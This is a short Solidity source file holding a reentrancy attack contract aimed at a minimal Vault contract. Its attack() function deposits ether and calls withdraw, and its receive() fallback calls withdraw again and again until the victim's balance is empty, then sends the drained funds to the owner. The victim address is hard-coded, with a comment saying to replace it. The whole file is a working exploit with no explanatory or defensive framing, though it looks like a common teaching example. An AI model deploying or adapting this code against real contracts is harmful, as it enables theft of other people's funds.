// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Vault {
    function deposit() external payable {}
    function withdraw() external {}
}

contract Reentrancy is Ownable {
    address victimContract = 0x9da9df2Fe440fA9E05B620a05990d7c644aCBBB8; // Replace this address with the address used to deploy the Vault contract.

    function attack() external payable onlyOwner {
        Vault vault = Vault(victimContract);
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        Vault vault = Vault(victimContract);
        if (address(vault).balance > 0) {
            vault.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }

}